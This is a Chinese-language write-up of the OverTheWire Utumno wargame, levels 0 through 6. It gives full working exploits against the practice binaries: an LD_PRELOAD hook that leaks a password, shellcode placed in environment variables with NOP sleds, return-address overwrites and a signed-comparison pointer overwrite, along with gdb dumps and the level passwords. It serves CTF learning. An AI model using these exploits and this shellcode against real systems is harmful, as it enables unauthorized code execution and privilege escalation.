---

title: CTF Waregames-Utumno-Writeup
lang: zh
layout: article
show_subscribe: false
tags: [wargame-ctf,Utumno]

---


## Utumno 00

这个不能dump到本地，因为没有读权限,只能登录上去做了。

```bash
utumno0@utumno:/utumno$ ./utumno0
Read me! :P
utumno0@utumno:/utumno$ file utumno0
utumno0: executable, regular file, no read permission
```

>没有读权限,gdb,objdump没有用。


但是可以用`LD_PRELOAD` hook动态链接的库函数,设置`LD_PRELOAD`环境变量时，`LD_PRELOAD`共享的目标会优先加载,举个例子: 

* 没有设置LD_PRELOAD环境变量的情况：

```bash
$ ldd plt
	linux-vdso.so.1 (0x00007ffcbd3e9000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe1e64a4000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fe1e66c0000)

```

* 设置LD_PRELOAD环境变量的情况：

```bash
$ export LD_PRELOAD=./preload.so

$ ldd plt
        linux-vdso.so.1 (0x00007ffff7fca000)
        ./preload.so (0x00007ffff7fba000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcd000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcc000)

```

于是，就可以用`LD_PRELOAD`来hook动态链接库函数。动态链接器会优先从`preload.so`中绑定函数地址。关于`LD_PRELOAD`可以参考：[Playing with LD_PRELOAD](https://axcheron.github.io/playing-with-ld_preload/)

因为有一个打印，先hook puts函数试下。

```cpp
#include <stdio.h>
// gcc preload.c -o preload.so -fPIC -shared -ldl -m32
int puts ( const char * str ) {
	printf("Hello from 'puts' !");

	return 0;	
}
```

运行一下:

```bash
utumno0@utumno:/tmp/preload$  LD_PRELOAD="./preload.so" /utumno/utumno0
Hello from 'puts' !utumno0@utumno:/tmp/preload$
```

看起来程序是用puts进行输出的,直接hook puts函数。

```cpp
#include <stdio.h>

// gcc preload.c -o preload.so -fPIC -shared -ldl -m32
int puts ( const char * str ) {
	printf("Hello from 'puts' !");
	return 0;	
}
```

因为没有读权限，看下密码有没有可能在栈上。

```cpp
#include <stdio.h>

int puts ( const char * str ) {
    printf("%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\n");
	return 0;	
}
// gcc preload.c -o preload.so -fPIC -shared -ldl -m32

```

```bash
utumno0@utumno:/tmp/preload$ LD_PRELOAD="./preload.so" /utumno/utumno0
f7fee710.ffffd5f4.f7fcf52c.f7fc3dbc.00000000.ffffd5c8.08048402.080484a5.08048490.00000000
```

有几个看起来不像栈的地址：`08048402.080484a5.08048490`。

```cpp
#include <stdio.h>

int puts ( const char * str ) {
    printf("%s.%s.%s\n",0x08048402,0x080484a5,0x08048490);
	return 0;	
}
// gcc preload.c -o preload.so -fPIC -shared -ldl -m32
```

```bash
utumno0@utumno:/tmp/preload$ LD_PRELOAD="./preload.so" /utumno/utumno0
���.Read me! :P.password: aathaeyiew

```

应该是一些全局字符串变量。迈出第一题还是有点艰难。

## Utumno 01 

**SSH :** ssh utumno1@utumno.labs.overthewire.org -p 2227

**Pass :** aathaeyiew

后面有读权限了，dump下来。自用dump脚本：

```bash
#!/usr/bin/env bash

###### preconfig here ##################

hostname="utumno.labs.overthewire.org"
total_usr="utumno"
port=2227

#########################################

file="/$total_usr/$total_usr"

# argument passed
usrid=$1
pass=$2

echo "sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  ."

sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  .

checksec $total_usr$usrid

```

```bash
$ ./crawl.sh 1 aathaeyiew
sshpass -p aathaeyiew scp -P 2227 utumno1@utumno.labs.overthewire.org:/utumno/utumno1  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/utumno1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

拿到IDA中分析一下。


程序大概逻辑就是检查一个文件夹里的文件，然后看有没有带`sh_`前缀的。如果有就调用run函数。动态调试可以看到run函数的逻辑就是让run函数返回地址指向`sh_文件`文件名中`sh_`后面的内容,然后程序开始执行`sh_文件`名中从`文件`开始的部分。

所以将shellcode嵌入到文件名后面即可。要注意的是touch的时候不能有`/`号,不然会以为是需要在那个文件夹下创建文件。所以就需要创建`/bin/sh`的软链接

先写一个shellcode,在`/bin/sh`版本上面改一下就ok了，名字这里改成aaaa:

```
[SECTION .text]

global _start

_start:
    xor    eax,eax
    push   eax
    push   0x61616161
    mov    ebx,esp
    xor    ecx,ecx
    xor    edx,edx
    mov    al,0xf 
    sub    al,4
    int    0x80

```

```bash
└─$  nasm -f elf32 shell.asm

└─$ ld -m elf_i386 -s -o shell shell.o

└─$ objdump -d ./shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
"\x31\xc0\x50\x68\x61\x61\x61\x61\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"

```

登录到远程：

```bash
utumno1@utumno:/tmp/yhc$ touch sh_$(python -c 'print "\x31\xc0\x50\x68\x61\x61\x61\x61\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')
utumno1@utumno:/tmp/yhc$ ln -s  /bin/sh aaaa
utumno1@utumno:/tmp/yhc$ /utumno/utumno1 `pwd`
$ whoami
utumno2
$ cat /etc/utumno_pass/utumno2
ceewaceiph
$ 

```

## Utumno 02 

**SSH :** ssh utumno2@utumno.labs.overthewire.org -p 2227

**Pass :** ceewaceiph


```bash
$ ./crawl.sh 2 ceewaceiph
sshpass -p ceewaceiph scp -P 2227 utumno2@utumno.labs.overthewire.org:/utumno/utumno2  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/utumno2'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

拿到IDA中分析一下。

程序逻辑就是先检查程序参数的数量，如果参数数量不为0，那么就打印`Aw..`。但正常调用程序的时候参数肯定>=1的(其本身算一个)。

搜索一番找到这个方法:[Starting program using execv and passing arguments with out raising argc](https://stackoverflow.com/questions/54225622/starting-program-using-execv-and-passing-arguments-with-out-raising-argc)。原理就是参数指针数组和环境变量指针数组在内存中的布局：

```
+---------+---------------------------------------+ 
| Args    | Environment                           |
+---------+---------+---------+---------+---------+
|  NULL   | envp[0] | envp[1] | envp[2] |  NULL   | 
+---------+---------+---------+---------+---------+
    ^         ^                   ^                     
    |         |                   |
 argv[0]    argv[1]     ...     argv[3]
```

所以envp[11]=argv[10];在evnp[11]里面写shllcode地址覆盖程序返回地址。用另一个程序调用`execve`函数来启动目标程序。


不能用在终端中写环境变量的方法来了，因为调用用的是execve,环境变量会被重新设置。但可以直接写在环境变量里传参进去。

来找一个返回地址使其指向我们的雪橇中间。


```bash
utumno2@utumno:/tmp/fdk$ cat  setup.c 
#include <unistd.h>

int main(){
        char *argv[] = { NULL };
        char *envp[] = { "0", "1", "2","3","4","5","6","7","\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80","aaaabbbbccccAAAABBBB", NULL };
        execve("/utumno/utumno2", argv, envp);
}


utumno2@utumno:/tmp/fdk$ gcc -m32 setup.c -o setup

```

参数,环境变量都在栈上,用gdb调试一下,选一个位置:

```bash
utumno2@utumno:/tmp/fdk$ gdb ./setup 

(gdb) r
Starting program: /tmp/fdk/setup 
process 20350 is executing new program: /utumno/utumno2

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/200wx $esp
0xffffddb0:	0x00000000	0xffffde44	0xffffde48	0x00000000
0xffffddc0:	0x00000000	0x00000000	0xf7fc5000	0xf7ffdc0c
0xffffddd0:	0xf7ffd000	0x00000000	0x00000000	0xf7fc5000
0xffffdde0:	0x00000000	0xa60fbcbe	0x9cf050ae	0x00000000
0xffffddf0:	0x00000000	0x00000000	0x00000000	0x08048350
0xffffde00:	0x00000000	0xf7fee710	0xf7e2a199	0xf7ffd000
0xffffde10:	0x00000000	0x08048350	0x00000000	0x08048371
0xffffde20:	0x0804844b	0x00000000	0xffffde44	0x08048490
0xffffde30:	0x080484f0	0xf7fe9070	0xffffde3c	0xf7ffd920
0xffffde40:	0x00000000	0x00000000	0xffffdf40	0xffffdf42
0xffffde50:	0xffffdf44	0xffffdf46	0xffffdf48	0xffffdf4a
0xffffde60:	0xffffdf4c	0xffffdf4e	0xffffdf50	0xffffdfd3
0xffffde70:	0x00000000	0x00000020	0xf7fd7c90	0x00000021
0xffffde80:	0xf7fd7000	0x00000010	0x178bfbff	0x00000006
0xffffde90:	0x00001000	0x00000011	0x00000064	0x00000003
0xffffdea0:	0x08048034	0x00000004	0x00000020	0x00000005
0xffffdeb0:	0x00000008	0x00000007	0xf7fd9000	0x00000008
0xffffdec0:	0x00000000	0x00000009	0x08048350	0x0000000b
0xffffded0:	0x00003e82	0x0000000c	0x00003e82	0x0000000d
0xffffdee0:	0x00003e82	0x0000000e	0x00003e82	0x00000017
0xffffdef0:	0x00000001	0x00000019	0xffffdf2b	0x0000001a
0xffffdf00:	0x00000000	0x0000001f	0xffffdfe8	0x0000000f
0xffffdf10:	0xffffdf3b	0x00000000	0x00000000	0x00000000
0xffffdf20:	0x00000000	0x00000000	0x62000000	0x6eb9cc81
0xffffdf30:	0x73a0acda	0x6f3f2e3b	0x69302ec9	0x00363836
0xffffdf40:	0x00310030	0x00330032	0x00350034	0x00370036
0xffffdf50:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdf60:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdf70:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdf80:	0x90909090	0x90909090	0x90909090	0x90909090
---Type <return> to continue, or q <return> to quit---
0xffffdf90:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdfa0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdfb0:	0x90909090	0x90909090	0x50c03190	0x732f2f68
0xffffdfc0:	0x622f6868	0xe3896e69	0xd231c931	0x042c0fb0
0xffffdfd0:	0x610080cd	0x62616161	0x63626262	0x41636363
0xffffdfe0:	0x42414141	0x00424242	0x7574752f	0x2f6f6e6d
0xffffdff0:	0x6d757475	0x00326f6e	0x00000000	0x00000000
0xffffe000:	Cannot access memory at address 0xffffe000
(gdb) 

```

选一个雪橇中间的位置,这里选`0xffffdf80`。让我们重写我们的setup.c。

```cpp
#include <unistd.h>

int main(){
        char *argv[] = { NULL };
        char *envp[] = { "0", "1", "2","3","4","5","6","7","\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80","aaaabbbbccccAAAA\x80\xdf\xff\xff", NULL };
        execve("/utumno/utumno2", argv, envp);
}
```

注意`\x80\xdf\xff\xff`写的顺序，因为粘贴的时候是低地址开始粘贴的。

```bash
utumno2@utumno:/tmp/fdk$ gcc -m32 setup.c -o setup
utumno2@utumno:/tmp/fdk$ ./setup 
$ whoami
utumno3
$ cat /etc/utumno_pass/utumno3
zuudafiine
$ 

```

## Utumno 03

**SSH :** ssh utumno3@utumno.labs.overthewire.org -p 2227

**Pass :** zuudafiine

依旧选择dump下来分析。

```bash
$ ./crawl.sh 3 zuudafiine
sshpass -p zuudafiine scp -P 2227 utumno3@utumno.labs.overthewire.org:/utumno/utumno3  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/utumno3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

扔到IDA中分析一波...

程序流程可以看出一共有两个getchar()。第一个getchar()决定你写在哪个位置(与ebp的偏移)，第二个getchar()决定你写的字符是啥。

IDA反编译结果：
```cpp

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  char b[24]; // [esp+0h] [ebp-3Ch]
  char a[24]; // [esp+18h] [ebp-24h]
  int c; // [esp+30h] [ebp-Ch]
  int i; // [esp+34h] [ebp-8h]

  c = 0;
  for ( i = 0; ; ++i )
  {
    c = getchar();
    if ( c == -1 || i > 23 )
      break;
    b[i] = c;
    b[i] ^= 3 * i;
    v3 = b[i];
    a[v3] = getchar();
  }
}
```

`^`表示异或,这里需要一点数学计算。我们要在返回地址上面写shellcode环境变量中的地址(还好只需要写4个字节,而不是整个shellcode)。异或运算有一个性质为：`a^b^b=a`。用这个性质帮助我们计算需要写的那个数。

登录到远程开干。

```bash
utumno3@utumno:/utumno$ export SHELLCODE=$(python -c 'print 200 * "\x90" + "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x61\x78\x63\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"')

```

shellcode之前试过一次，拿不到shell，但发现直接cat密码可以。上面shellcode是直接cat密码版本,用cat的缺点是复用性比较低。下面让我们用gdb找到环境变量地址。

```bash
utumno3@utumno:/utumno$ gdb utumno3 
(gdb) break *main
Breakpoint 1 at 0x80483eb: file utumno3.c, line 20.
(gdb) r
Starting program: /utumno/utumno3 

Breakpoint 1, main (argc=1, argv=0xffffd564) at utumno3.c:20
20	utumno3.c: No such file or directory.

(gdb) x/1200wx $esp

...
0xffffddbc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddcc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdddc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddec:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddfc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde0c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde1c:	0x90909090	0x90909090	0x90909090	0x90909090
---Type <return> to continue, or q <return> to quit---
0xffffde2c:	0x90909090	0xc0319090	0x520bb099	0x61632f68
0xffffde3c:	0x622f6874	0xe3896e69	0x612f6852	0x2f686378
0xffffde4c:	0x89706d74	0xe28952e1	0xe1895351	0x550080cd
0xffffde5c:	0x3d524553	0x6d757475	0x00336f6e	0x3d445750
0xffffde6c:	0x7574752f	0x006f6e6d	0x454e494c	0x31333d53
0xffffde7c:	0x4d4f4800	0x682f3d45	0x2f656d6f	0x6d757475
0xffffde8c:	0x00336f6e	0x5f485353	0x45494c43	0x313d544e
0xffffde9c:	0x322e3338	0x322e3732	0x312e3030	0x31203839
0xffffdeac:	0x31343131	0x00323220	0x415f434c	0x45524444
0xffffdebc:	0x653d5353	0x53555f6e	0x4654552e	0x4c00382d
...

```

多看几个，慢慢翻找到shellcode地址,这里就选`0xffffddcc`。

&ensp;&ensp;ebp+40(40^0=0)需要写0x39,i等于0:"\x28\xcc"

&ensp;&ensp;ebp+41(41^3=42)需要写0xde,i等于1: "\x2a\xdd"

&ensp;&ensp;ebp+42(42^6=45)需要写0xff,i等于2: "\x2c\xff"

&ensp;&ensp;ebp+43(43^9=34)需要写0xff,i等于3: "\x22\xff"

运行一下：

```bash
utumno3@utumno:/utumno$ python -c "print '\x28\xcc\x2a\xdd\x2c\xff\x22\xff'" | /utumno/utumno3
oogieleoga
utumno3@utumno:/utumno$ 

```

## Utumno 04 

**SSH :** ssh utumno4@utumno.labs.overthewire.org -p 2227

**Pass :** oogieleoga

依旧选择dump下来分析。

```bash
$ ./crawl.sh 4 oogieleoga
sshpass -p oogieleoga scp -P 2227 utumno4@utumno.labs.overthewire.org:/utumno/utumno4  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/utumno4'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

用IDA分析流程分析出来大概是将参数1字符串转成数字(int型)，如果数字转成unsigned short后>63程序就退出，否者将参数2粘贴到栈上。

观察将int转成unsigned short的反汇编:
```
mov     [ebp+j], ax
```

转的过程实际上是将eax的低16位复制过去(ax表示eax的低16位)。所以我们把arg1的低16位弄成全为0传进去就ok了(2**16=65536)。

还是用shellcode环境变量,上号用gdb看一下栈上的情况。

```bash
utumno4@utumno:/utumno$ export SHELLCODE=$(python -c 'print 200 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')
utumno4@utumno:/utumno$ gdb utumno4

(gdb) break *main
Breakpoint 1 at 0x804844b: file utumno4.c, line 20.
(gdb) r
Starting program: /utumno/utumno4 

Breakpoint 1, main (argc=1, argv=0xffffd574) at utumno4.c:20
20	utumno4.c: No such file or directory.

(gdb) x/1200wx $esp

...
0xffffdd7c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd8c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd9c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddac:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddbc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddcc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdddc:	0x90909090	0x90909090	0x90909090	0x90909090
---Type <return> to continue, or q <return> to quit---
0xffffddec:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddfc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde0c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde1c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde2c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde3c:	0x90909090	0xc0319090	0x2f2f6850	0x2f686873
0xffffde4c:	0x896e6962	0x31c931e3	0x2c0fb0d2	0x0080cd04
0xffffde5c:	0x52455355	0x7574753d	0x346f6e6d	0x44575000
0xffffde6c:	0x74752f3d	0x6f6e6d75	0x4e494c00	0x333d5345
0xffffde7c:	0x4f480030	0x2f3d454d	0x656d6f68	0x7574752f
0xffffde8c:	0x346f6e6d	0x48535300	0x494c435f	0x3d544e45
0xffffde9c:	0x2e333831	0x2e373232	0x2e303032	0x20383931
...
```

选一个雪橇中间的位置，就选`0xffffddcc`吧,长得比较整齐。

退出gdb输入构造好的命令。观察栈布局，需要填充65286个。

```bash
utumno4@utumno:/utumno$ ./utumno4 65536  $(python -c "print '\x90'*65286+'\xcc\xdd\xff\xff'")
$ whoami
utumno5
$ cat /etc/utumno_pass/utumno5
woucaejiek

```

## Utumno 05

**SSH :** ssh utumno5@utumno.labs.overthewire.org -p 2227

**Pass :** woucaejiek

依旧选择dump下来分析。

```bash
$ ./crawl.sh 5 woucaejiek
sshpass -p woucaejiek scp -P 2227 utumno5@utumno.labs.overthewire.org:/utumno/utumno5  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/utumno5'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

和第二个有点像，用IDA分析出来流程就是先检查argc要为0,然后调用hihi函数将argv[10]复制到一个buf[12]局部变量里面去，它设置的长度还保证能够覆盖返回地址。

直接上号，按照第二个同样的方法来弄。不能说完全相似，只能说一模一样。

```bash
utumno5@utumno:/tmp/eag$ cat ./setup.c 
#include <unistd.h>

int main(){
            char *argv[] = { NULL };
                    char *envp[] = { "0", "1", "2","3","4","5","6","7","\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80","aaaabbbbccccAAAABBBB", NULL };
                            execve("/utumno/utumno5", argv, envp);
}

utumno5@utumno:/tmp/eag$ gdb setup
(gdb) r

Starting program: /tmp/eag/setup 
process 24509 is executing new program: /utumno/utumno5
Here we go - aaaabbbbccccAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) x/1200wx $ebp

...
0xffffdf24:	0x00000000	0x63000000	0xe8872b30	0xad00e522
0xffffdf34:	0xb1ee0e45	0x69c4bc98	0x00363836	0x00310030
0xffffdf44:	0x00330032	0x00350034	0x00370036	0x90909090
0xffffdf54:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdf64:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdf74:	0x90909090	0x90909090	0x90909090	0x90909090
---Type <return> to continue, or q <return> to quit---
0xffffdf84:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdf94:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdfa4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdfb4:	0x90909090	0x50c03190	0x732f2f68	0x622f6868
0xffffdfc4:	0xe3896e69	0xd231c931	0x042c0fb0	0x610080cd
0xffffdfd4:	0x62616161	0x63626262	0x41636363	0x42414141
0xffffdfe4:	0x00424242	0x7574752f	0x2f6f6e6d	0x6d757475
0xffffdff4:	0x00356f6e	0x00000000	0x00000000	Cannot access memory at address 0xffffe000
(gdb) 
...


```

就选`0xffffdf84`地址吧。改完之后编译再执行。

```bash
utumno5@utumno:/tmp/eag$ gcc -m32 setup.c -o setup
utumno5@utumno:/tmp/eag$ ./setup 
Here we go - aaaabbbbccccAAAA����
$ whoami
utumno6
$  cat /etc/utumno_pass/utumno6
eiluquieth
$ 

```

## Utumno 06

**SSH :** ssh utumno6@utumno.labs.overthewire.org -p 2227

**Pass :** eiluquieth

依旧选择dump下来分析。

```bash
$ ./crawl.sh 6 eiluquieth
sshpass -p eiluquieth scp -P 2227 utumno6@utumno.labs.overthewire.org:/utumno/utumno6  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/utumno6'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

IDA反编译结果(main::a结构已添加)：

```cpp
struct main::a{
    char *p;
    table[10];
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  main::a b; // [esp+0h] [ebp-34h]
  int pos; // [esp+2Ch] [ebp-8h]
  int val; // [esp+30h] [ebp-4h]

  if ( argc <= 2 )
  {
    puts("Missing args");
    exit(1);
  }
  b.p = (char *)malloc(32u);
  if ( !b.p )
  {
    puts("Sorry, ran out of memory :-(");
    exit(1);
  }
  val = strtoul(argv[2], 0, 16);
  pos = strtoul(argv[1], 0, 10);
  if ( pos > 10 )
  {
    puts("Illegal position in table, quitting..");
    exit(1);
  }
  b.table[pos] = val;
  strcpy(b.p, argv[3]);
  printf("Table position %d has value %d\nDescription: %s\n", pos, b.table[pos], b.p);
  return 0;
}

```

程序逻辑大概是有一个栈上的表table，执行table[arg2(为16进制)]=arg1(10进制)。然后把arg3(下标从0开始)复制在堆上，栈上虽然有长度>10的检查，但是没有小于的检查。

```bash
└─$ ./utumno6 1 41 djfkas
Table position 1 has value 65
Description: djfkas

```


观察IDA 反编译的if判断语句(`if(pos>10)`)所对应的反汇编代码:

```
.text:08048553                 cmp     [ebp+pos], 0Ah
.text:08048557                 jle     short loc_804856D
```

jle是有符号数的比较,但`strtoul`函数返回的是无符号数,也就是说如果输入-1，那么strtoul返回0xffffffff。在比较的时候`if(pos>10)`会为否。

**输入-1会怎么样? TL;DR:**

输入-1会strcpy会将你写arg3的内容拷贝到arg2参数所指向的地址上去。

**原理:**

b.table 的位置是ebp-48,b.p的位置是`ebp-52`。`ebp+eax*4+b.table`运算出来的结果是`ebp+-1*4-48=ebp-52`，正好是b.p的位置。

假设我们执行`./utumno6 -1 0x41414141 abcd`,观察下面判断过后所要执行的反汇编指令(当然你也可以动态调试)。此时eax=-1,edx=arg2(16进制),我添加了注释。

```
.text:08048573 038                 mov     [ebp+eax*4+b.table], edx ;写到ebp-52位置上，也就是b.p的位置。
.text:08048577 038                 mov     eax, [ebp+argv]  
.text:0804857A 038                 add     eax, 12
.text:0804857D 038                 mov     edx, [eax]  ; 得到参数3的地址,也就是我们的字符串的地址
.text:0804857F 038                 mov     eax, [ebp+b.p]  ; 得到栈上b.p所存的地址。
.text:08048582 038                 push    edx             ; src
.text:08048583 03C                 push    eax             ; dest
.text:08048584 040                 call    _strcpy ; 将我们的字符串粘贴到b.p所指向的地址上去。
```


所以在第二个参数里面写栈上的返回地址，第三个参数里面写shellcode环境变量地址。理论上就ok了。开始上号。

```bash
utumno6@utumno:/utumno$ export SHELLCODE=$(python -c 'print 200 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')

utumno6@utumno:/utumno$ gdb ./utumno6

(gdb) break *main
(gdb) r
Starting program: /utumno/utumno6 

Breakpoint 1, main (argc=1, argv=0xffffd624) at utumno6.c:22
22	utumno6.c: No such file or directory.

(gdb) x/1200wx $esp
...

0xffffdddc:	0x90903d45	0x90909090	0x90909090	0x90909090
0xffffddec:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddfc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde0c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde1c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde2c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde3c:	0x90909090	0xc0319090	0x2f2f6850	0x2f686873
---Type <return> to continue, or q <return> to quit---
0xffffde4c:	0x896e6962	0x31c931e3	0x2c0fb0d2	0x0080cd04
0xffffde5c:	0x52455355	0x7574753d	0x366f6e6d	0x44575000
0xffffde6c:	0x74752f3d	0x6f6e6d75	0x4e494c00	0x323d5345
0xffffde7c:	0x4f480035	0x2f3d454d	0x656d6f68	0x7574752f
0xffffde8c:	0x366f6e6d	0x48535300	0x494c435f	0x3d544e45

...

(gdb) info registers 
eax            0xf7fc6dbc	-134451780
ecx            0x7d45ea47	2101733959
edx            0xffffd504	-11004
ebx            0x0	0
esp            0xffffd4bc	0xffffd4bc
ebp            0x0	0x0
esi            0x1	1
edi            0xf7fc5000	-134459392
eip            0x80484db	0x80484db <main>
eflags         0x292	[ AF SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99

```

返回地址在`0xffffd4bc`。

构造:

```
./utumno6 -1 0xffffd4bc  $(python -c 'print "\xcc\xdd\xff\xff"')
```

一个一个试出返回地址的栈位置,地址每次+0x10,也可以用第7道题用的地址枚举脚本。

```bash
utumno6@utumno:/utumno$ ./utumno6 -1 0xffffd4bc  $(python -c 'print "\xcc\xdd\xff\xff"')
Table position -1 has value -11076
Description: ����
utumno6@utumno:/utumno$ ./utumno6 -1 0xffffd4cc  $(python -c 'print "\xcc\xdd\xff\xff"')
Table position -1 has value -11060
Description: ����
utumno6@utumno:/utumno$ ./utumno6 -1 0xffffd4dc  $(python -c 'print "\xcc\xdd\xff\xff"')
Table position -256 has value -136216536
Description: ����
utumno6@utumno:/utumno$ ./utumno6 -1 0xffffd4ec  $(python -c 'print "\xcc\xdd\xff\xff"')
Table position -1 has value -11028
Description: ����
$ whoami
utumno7
$ cat /etc/utumno_pass/utumno7
totiquegae
$ 

```

比较有意思的题,一个不注意的有符号数比较而引起的漏洞。


## Utumno 07

**SSH :** ssh utumno7@utumno.labs.overthewire.org -p 2227

